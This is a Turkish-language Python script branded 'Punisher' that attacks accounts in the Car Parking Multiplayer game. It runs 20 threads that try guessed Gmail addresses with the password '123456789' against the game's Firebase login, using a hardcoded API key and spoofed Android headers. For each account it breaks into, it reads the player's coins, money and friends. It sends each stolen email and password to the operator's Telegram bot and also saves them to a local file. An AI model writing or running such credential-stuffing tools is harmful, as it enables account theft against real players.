import requests, json, datetime, random, os, threading, time
try:
    from colorama import Fore
except:
    os.system('pip install colorama')
    from colorama import Fore
try:
    from cfonts import render, say
except:
    os.system('pip install python-cfonts')
    from cfonts import render, say
try:
    from names import get_first_name
except:
    os.system('pip install names')
    from names import get_first_name

# Zaman kontrolü
simdi = datetime.datetime.now()
kapanma_saati = simdi.replace(hour=22, minute=30, second=0, microsecond=0)

if simdi >= kapanma_saati:
    print("Saat 22:00 olduğu için program kapatıldı.")
    exit()

token = input ("T O K E N :")
sohbet_id = input ("İd girin:")

# Konsolda logo
say('Punisher', colors=['red', 'white'], align='center')

basliklar = {
    "Content-Type": "application/json",
    "X-Android-Package": "com.olzhas.carparking.multyplayer",
    "X-Android-Cert": "D4962F8124C2E09A66B97C8E326AFF805489FE39",
    "Accept-Language": "tr-TR, en-US",
    "X-Client-Version": "Android/Fallback/X22001001/FirebaseCore-Android",
    "X-Firebase-GMPID": "1:581727203278:android:af6b7dee042c8df539459f",
    "X-Firebase-Client": "H4sIAAAAAAAAAKtWykhNLCpJSk0sKVayio7VUSpLLSrOzM9TslIyUqoFAFyivEQfAAAA",
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; A5010 Build/PI)",
    "Host": "www.googleapis.com",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip"
}

renkler = ['\033[1;33m','\033[2;32m','\033[2;35m','\033[1;34m','\033[2;36m','\033[1;97m','\033[1;35m']
rastgele_renk = random.choice(renkler)
beyaz = "\033[1;97m"
kirmizi = '\033[1;31m'
yesil = '\033[2;32m'
parlak = '\x1b[1;97m'

dogru = 0
yanlis = 0

def json_coz(d):
    for anahtar, deger in d.items():
        if isinstance(deger, str):
            try:
                ic_json = json.loads(deger)
                d[anahtar] = json_coz(ic_json)
            except json.JSONDecodeError:
                continue
        elif isinstance(deger, dict):
            d[anahtar] = json_coz(deger)
    return d

def giris(email, sifre):
    global dogru, yanlis
    
    # Zaman kontrolü - her giriş denemesinden önce kontrol et
    if datetime.datetime.now() >= kapanma_saati:
        print("Saat 22:00 olduğu için işlem durduruldu.")
        return
    
    veri = {
        "email": email,
        "password": sifre,
        "returnSecureToken": True,
        "clientType": "CLIENT_TYPE_ANDROID"
    }
    cevap = requests.post(
        "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM",
        json=veri, headers=basliklar).json()

    if "idToken" in cevap:  
        jeton = cevap["idToken"]  
        veri2 = {"idToken": jeton}  
        cevap2 = requests.post(  
            "https://www.googleapis.com/identitytoolkit/v3/relyingparty/getAccountInfo?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM",  
            json=veri2, headers=basliklar).json()  
          
        hesap_tarihi = cevap2['users'][0]['createdAt']  
        veri3 = {"data": "2893216D41959108CB8FA08951CB319B7AD80D02"}  
        basliklar2 = {  
            "authorization": f"Bearer {jeton}",  
            "firebase-instance-id-token": "f0Rstd-MTbydQx9M2eLlTM:APA91bF7UdxnXLAaybpBODKCRnyLu44eFWygoIfnLn7kOE9aujlb5WcvTv-EyA5mTNbVBPQ-r-x967XJqEA3TX23gGyXCSbMEEa2PIccvNU98uEcdun1qMgYbCOY4hPBBD2w6G9mfX_m",  
            "content-type": "application/json; charset=utf-8",  
            "accept-encoding": "gzip",  
            "user-agent": "okhttp/3.12.13"  
        }  
        bilgi = requests.post("https://us-central1-cp-multiplayer.cloudfunctions.net/GetPlayerRecords2", json=veri3, headers=basliklar2).text  
        hesap_veri = json.loads(bilgi)  
        if 'result' in hesap_veri:  
            hesap_veri['result'] = json_coz(json.loads(hesap_veri['result']))  
        sonuc = hesap_veri["result"]  

        oyuncu_adi = sonuc.get('Name', 'Bilinmiyor')  
        arkadas_sayisi = len(sonuc.get('FriendsID', []))  
        altin = sonuc.get('coin', '0')  
        para = sonuc.get('money', '0')  
        tarih = str(datetime.datetime.fromtimestamp(int(hesap_tarihi) / 1000)).split(' ')[0]  

        mesaj = f"""

• Car Parking hesabı bulundu

📧 Email: {email}
🔑 Şifre: {sifre}
👤 İsim: {oyuncu_adi}
💰 Altın: {altin}
💵 Para: {para}
👥 Arkadaşlar: {arkadas_sayisi}
📅 Açılış: {tarih}

[@Punishe0 ]
"""

        try:  
            requests.post(f'https://api.telegram.org/bot{token}/sendMessage', params={'chat_id': sohbet_id, 'text': mesaj, 'parse_mode': 'Markdown'})  
        except:  
            pass  

        with open("Luffy.txt", "a", encoding="utf-8") as dosya:  
            dosya.write(f"{email}:{sifre} | İsim: {oyuncu_adi} | Altın: {altin} | Para: {para} | Arkadaş: {arkadas_sayisi} | Tarih: {tarih}\n")  

        dogru += 1  
    else:  
        yanlis += 1  
    print(f'''{rastgele_renk} <  {yesil} Doğru : {beyaz}{dogru} ~ {kirmizi} Hatalı {beyaz}{yanlis}  >{parlak}''')

def calistir():
    while True:
        # Zaman kontrolü - döngü içinde sürekli kontrol
        if datetime.datetime.now() >= kapanma_saati:
            print("Saat 22:00 olduğu için program durduruldu.")
            break
            
        isim = get_first_name()
        sayi = ''.join(random.choices('1234567890', k=random.randint(1, 2)))
        email = f"{isim}{sayi}@gmail.com"
        sifre = "123456789"
        giris(email, sifre)

threadler = []
for _ in range(20):
    t = threading.Thread(target=calistir)
    t.start()
    threadler.append(t)

# Ana thread için de zaman kontrolü
while True:
    if datetime.datetime.now() >= kapanma_saati:
        print("Saat 22:00 olduğu için tüm program sonlandırıldı.")
        os._exit(0)
    time.sleep(1)
